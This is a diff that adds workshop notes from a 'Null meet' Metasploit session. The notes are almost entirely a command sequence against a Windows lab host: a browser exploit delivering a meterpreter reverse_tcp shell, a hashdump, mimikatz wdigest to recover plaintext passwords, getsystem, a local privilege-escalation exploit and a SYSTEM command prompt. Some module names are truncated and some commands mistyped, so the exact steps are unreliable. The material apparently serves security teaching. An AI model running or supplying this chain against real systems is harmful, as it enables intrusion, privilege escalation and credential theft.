@@ -1,0 +1,67 @@
+Null meet:
+
+Metasploit - rupam ru94mb@null.co.in
+
+command to run metasploit console:	msfconsole
+
+msf> use exploit/windows/browser/msl0_0
+msf> use exploit/windows/browser/msl0_0clear
+msf> info
+msf> show options
+msf> set SRVHOST 192.168.56.102
+msf> show targets
+
+setting payload:
+msf> set PAYLOAD windows/meterpreter/reverse_tcp
+
+setting localhost:
+msf> set LHOST 192.168.56.102
+
+msf> exploit
+msf> show sessions
+msf> sessions -i 1
+
+meterpreter> getuid
+meterpreter> getpid
+meterpreter> run post/windows/gather/hashdump
+
+Mimikatz - tool to elevate priviliges, get plain text passwords
+meterpreter> load mimikatz
+
+meterpreter> wdigest
+
+meterpreter> getsystem
+
+meterpreter> background
+
+msf > use exploit/windows/local/ms10_0
+
+msf> set SESSION 1
+
+msf> set PAYLOAD windows/meterpreter/reverse_tcp
+
+msf> set LHOST 192.168.56.102
+
+msf> exploit
+
+msf> show sessions
+
+msf> sessions -i 1
+
+meterpreter> shell
+
+Obtained system level and command prompt of windows
+C:\windows\system32> exit
+
+msf> sessions -i 2
+
+meterpreter> getui
+
+meterpreter> getuid
+
+meterpreter> run post/windows/gather/hashdump
+
+meterpreter> load mimikatz
+
+meterpreter> wdigest
+
